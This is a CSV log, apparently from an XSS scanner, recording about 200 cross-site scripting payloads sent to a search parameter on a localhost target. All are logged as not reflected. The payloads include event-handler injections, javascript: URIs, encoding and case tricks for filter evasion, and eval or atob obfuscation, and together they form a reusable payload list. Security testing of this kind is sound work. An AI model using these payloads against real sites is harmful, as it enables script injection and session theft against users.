Timestamp,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=alert`1`>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=alert(document.cookie)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img/src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<img src=""x"" onerror=""alert(1)"">",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src='x' onerror='alert(1)'>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<body onload=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<body onpageshow=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<body onfocus=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<body onhashchange=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<body onload=prompt(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<body onload=confirm(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input onblur=alert(1) autofocus><input>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=text value=x onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=button value=xss onclick=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<input type=image src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<iframe src=javascript:alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<iframe src=""javascript:alert(1)"">",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<iframe onload=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<iframe/onload=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<iframe  rc=""data:text/html,<script>alert(1)</script>"">",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,'-alert(1)-',NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<details open ontoggle=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<details ontoggle=alert(1)><summary>xss</summary></details>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<details open ontoggle=prompt(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<object data=javascript:alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<embed src=javascript:alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<object data=""data:text/html,<script>alert(1)</script>"">",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<select onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<textarea onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<keygen onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<marquee onstart=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<marquee loop=1 onfinish=alert(1)>x</marquee>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<video src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<audio src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<video><source onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<link rel=stylesheet href=javascript:alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<a href=javascript:alert(1)>click</a>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<a href=""javascript:alert(1)"">click</a>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<form action=javascript:alert(1)><input type=submit>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<form><button formaction=javascript:alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<form><input formaction=javascript:alert(1) type=submit value=X>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<meta http-equiv=refresh content=0;url=javascript:alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<meta http-equiv=refresh content=""0;javascript:alert(1)"">",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<style>*{background:url('javascript:alert(1)')}</style>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<style>@import'javascript:alert(1)';</style>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<style onload=alert(1)></style>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<math><mi xlink:href=javascript:alert(1)>X</mi></math>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<table background=javascript:alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<table><td background=javascript:alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div onload=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<div style=width:expression(alert(1))>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert&#40;1&#41;</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert&#x28;1&#x29;</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>\u0061lert(1)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>eval('\x61lert(1)')</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onabort=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onactivate=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onafterprint=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onafterupdate=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onbeforeactivate=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onbeforecopy=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onbeforecut=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onbeforedeactivate=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onbeforeeditfocus=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onbeforepaste=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onbeforeprint=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onbeforeunload=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onbeforeupdate=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onblur=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onbounce=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x oncellchange=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onchange=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onclick=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x oncontextmenu=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x oncontrolselect=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x oncopy=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x oncut=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x ondataavailable=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x ondatasetchanged=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x ondatasetcomplete=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x ondblclick=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x ondeactivate=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x ondrag=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x ondragend=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x ondragenter=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x ondragleave=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x ondragover=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x ondragstart=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x ondrop=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerrorupdate=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onfilterchange=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onfinish=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onfocus=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onfocusin=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onfocusout=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onhelp=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x oninput=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onkeydown=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onkeypress=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onkeyup=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onlayoutcomplete=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onload=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onlosecapture=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onmousedown=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onmouseenter=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onmouseleave=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onmousemove=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onmouseout=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onmouseover=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onmouseup=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onmousewheel=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onmove=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onmoveend=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onmovestart=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onpaste=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onpropertychange=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onreadystatechange=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onreset=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onresize=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onresizeend=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onresizestart=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onrowenter=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onrowexit=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onrowsdelete=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onrowsinserted=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onscroll=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onselect=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onselectionchange=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onselectstart=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onstart=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onstop=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onsubmit=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onunload=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,javascript:alert(1),NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,javascript:alert('XSS'),NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,javascript:prompt(1),NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,javascript:confirm(1),NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"data:text/html,<script>alert(1)</script>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"data:text/html,<img src=x onerror=alert(1)>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/oncut=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onclick=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/ondrag=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/ondrop=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onfocus=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/oninput=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onload=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onmove=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onpaste=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onreset=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onresize=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onscroll=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onselect=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onstart=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onstop=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<q/onsubmit=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(1),NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=alert(1),NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg onload=alert(1),NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<body onload=alert(1),NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,alert(1),NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img	src=x	onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,onload=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<ScRiPt>alert(1)</ScRiPt>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<sCrIpT>alert(1)</sCrIpT>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<SCRIPT>alert(1)</SCRIPT>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<IMG SRC=x ONERROR=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<ImG sRc=x OnErRoR=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<SVG ONLOAD=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<SvG oNlOaD=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,< script >alert(1)< / script >,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,< img src=x onerror=alert(1) >,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,< svg onload=alert(1) >,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<scr<script>ipt>alert(1)</scr</script>ipt>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<<script>script>alert(1)<</script>/script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<img src=""x""onerror=alert(1)>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg/onload=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg//onload=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,%3Cscript%3Ealert(1)%3C/script%3E,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,%3Cimg%20src=x%20onerror=alert(1)%3E,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,%3Csvg%20onload=alert(1)%3E,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert`1`</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=alert`1`>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg onload=alert`1`>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>/**/alert(1)/**/</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script><!---->alert(1)<!----></script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=/**/alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>eval('alert(1)')</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<script>eval(""alert(1)"")</script>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>eval(atob('YWxlcnQoMSk='))</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=eval('alert(1)')>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg onload=eval('alert(1)')>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>Function('alert(1)')()</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>new Function('alert(1)')()</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=Function('alert(1)')()>,NO_REFLECTION,No,,Info
